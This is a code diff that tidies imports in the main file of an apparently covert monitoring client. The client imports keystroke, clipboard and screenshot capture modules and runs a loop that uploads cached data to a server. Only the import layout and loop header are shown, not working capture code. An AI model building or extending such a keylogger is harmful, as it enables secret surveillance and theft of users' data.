@@ -1,22 +1,21 @@
-import sys
 import os
+import sys
 
 # Add client directory to the Python path
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 
 # Now import other modules
-import threading
 import time
+import threading
+from utils import log
+from cache import ensure_cache_directory
 from clipboard import start_clipboard_monitoring
 from keystrokes import start_keystroke_monitoring
 from screenshots import start_screenshot_monitoring
-from utils import log
 from sender import server_is_online, send_cached_data
-from cache import ensure_cache_directory
 
 
 def cache_sync_loop():
-    """Periodically attempt to send cached data"""
     while True:
         time.sleep(60)  # Check every minute
         if server_is_online():
